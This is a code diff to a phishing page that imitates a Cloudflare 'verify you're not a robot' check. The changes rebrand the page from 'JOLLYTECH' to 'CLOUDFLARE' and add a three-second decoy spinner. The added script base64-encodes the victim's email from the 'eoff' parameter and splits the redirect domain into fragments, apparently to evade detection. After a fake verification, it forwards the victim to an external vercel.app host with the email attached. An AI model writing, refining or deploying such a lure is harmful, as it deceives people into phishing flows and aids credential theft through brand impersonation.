@@ -13,7 +13,7 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f9f9f9; /* Soft whitish background */
+            background-color: #f9f9f9;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -23,11 +23,26 @@
             color: #333;
         }
 
+        .initial-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4CAF50;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         .instruction {
-            margin-bottom: 24px;
+            margin-bottom: 18px;
             text-align: center;
             font-size: 16px;
             color: #555;
+            display: none;
         }
 
         .verification-container {
@@ -41,6 +56,7 @@
             justify-content: space-between;
             align-items: center;
             border: 1px solid #eaeaea;
+            display: none;
         }
 
         .verification-left {
@@ -112,11 +128,6 @@
             display: none;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
         .success-check {
             width: 20px;
             height: 20px;
@@ -152,16 +163,16 @@
         }
 
         .logo {
-            width: 24px;
-            height: 24px;
-            margin-right: 8px;
+            width: 32px;
+            height: 32px;
+            margin-right: 4px;
             border-radius: 4px;
         }
 
         .brand {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            font-size: 16px;
-            font-weight: 600;
+            font-size: 13px;
+            font-weight: 500;
             color: #333;
             letter-spacing: 0.5px;
         }
@@ -184,11 +195,15 @@
     </style>
 </head>
 <body>
-    <div class="instruction">
+    <!-- Only the spinner shows initially -->
+    <div class="initial-spinner" id="initialSpinner"></div>
+
+    <!-- Everything else is hidden initially -->
+    <div class="instruction" id="instruction">
         To view this document, verify you're not a robot below
     </div>
 
-    <div class="verification-container">
+    <div class="verification-container" id="verificationContainer">
         <div class="verification-left">
             <div class="checkbox-container">
                 <input type="checkbox" id="verification-checkbox" class="checkbox">
@@ -204,8 +219,8 @@
 
         <div class="verification-right">
             <div class="logo-container">
-                <img src="cloudflare_.png" alt="Cloudflare" class="logo" style="width:24px;height:24px;">
-                <div class="brand">JOLLYTECH</div>
+                <img src="cloudflare_.png" alt="Cloudflare" class="logo" style="width:32px;height:32px;">
+                <div class="brand">CLOUDFLARE</div>
             </div>
             <div class="footer">
                 <a href="#">Privacy</a> · <a href="#">Terms</a>
@@ -216,12 +231,18 @@
     <script>
         // Function to encode string to base64
         function encodeBase64(str) {
-            // For browser compatibility
             if (typeof btoa === 'function') {
                 return btoa(str);
             }
-            // Fallback for Node.js environment (though not needed in browser)
             return Buffer.from(str).toString('base64');
+        }
+
+        // Function to decode base64 string
+        function decodeBase64(str) {
+            if (typeof atob === 'function') {
+                return atob(str);
+            }
+            return Buffer.from(str, 'base64').toString();
         }
 
         // Function to get URL parameters
@@ -234,21 +255,50 @@
             return decodeURIComponent(results[2].replace(/\+/g, ' '));
         }
 
-        // Function to build redirect URL with encoded email
-        function buildRedirectUrl() {
-            const baseRedirectUrl = 'https://xyz123-blush.vercel.app/';
-            const email = getUrlParameter('eoff');
+        // Function to check if a string is base64 encoded
+        function isBase64(str) {
+            try {
+                return btoa(atob(str)) === str;
+            } catch (err) {
+                return false;
+            }
+        }
 
-            if (email) {
-                // Encode the email in base64
-                const encodedEmail = encodeBase64(email);
-                // Return the redirect URL with encoded email parameter
-                return `${baseRedirectUrl}?eoff=${encodedEmail}`;
+        // Function to process URL and ensure eoff parameter is always encoded
+        function processUrl() {
+            const currentUrl = new URL(window.location.href);
+            const eoffParam = currentUrl.searchParams.get('eoff');
+
+            if (eoffParam && !isBase64(eoffParam)) {
+                const encodedEmail = encodeBase64(eoffParam);
+                const newUrl = `${window.location.origin}${window.location.pathname}?eoff=${encodedEmail}`;
+                window.history.replaceState(null, '', newUrl);
+            }
+        }
+
+        // Function to build redirect URL with encoded email (broken into parts)
+        function buildRedirectUrl() {
+            const protocol = 'https:';
+            const domain = '//xyz123-blush.vercel.app';
+            const path = '/';
+            const eoffParam = getUrlParameter('eoff');
+
+            if (eoffParam) {
+                return `${protocol}${domain}${path}?eoff=${eoffParam}`;
             }
 
-            // If no email parameter, just redirect to base URL
-            return baseRedirectUrl;
+            return `${protocol}${domain}${path}`;
         }
+
+        // Process URL on page load
+        processUrl();
+
+        // Show only spinner for 3 seconds, then show everything else
+        setTimeout(function() {
+            document.getElementById('initialSpinner').style.display = 'none';
+            document.getElementById('instruction').style.display = 'block';
+            document.getElementById('verificationContainer').style.display = 'flex';
+        }, 3000);
 
         document.getElementById('verification-checkbox').addEventListener('change', function() {
             const checkbox = this;
@@ -258,33 +308,23 @@
             const successCheck = document.getElementById('success-check');
 
             if (checkbox.checked) {
-                // Hide the checkbox and show spinner
                 customCheckbox.style.display = 'none';
                 spinner.style.display = 'block';
                 verificationText.textContent = 'Verifying...';
 
-                // Simulate verification process
                 setTimeout(function() {
-                    // Hide spinner and show success check
                     spinner.style.display = 'none';
                     successCheck.style.display = 'flex';
-
-                    // Change text to "Success!"
                     verificationText.textContent = 'Success!';
 
-                    // Build the redirect URL with encoded email
                     const redirectUrl = buildRedirectUrl();
-
-                    // Log for debugging (remove in production)
                     console.log('Redirecting to:', redirectUrl);
 
-                    // Redirect after a brief delay
                     setTimeout(function() {
                         window.location.href = redirectUrl;
                     }, 1000);
                 }, 1500);
             } else {
-                // Reset if unchecked (though this shouldn't happen in normal flow)
                 customCheckbox.style.display = 'flex';
                 spinner.style.display = 'none';
                 successCheck.style.display = 'none';
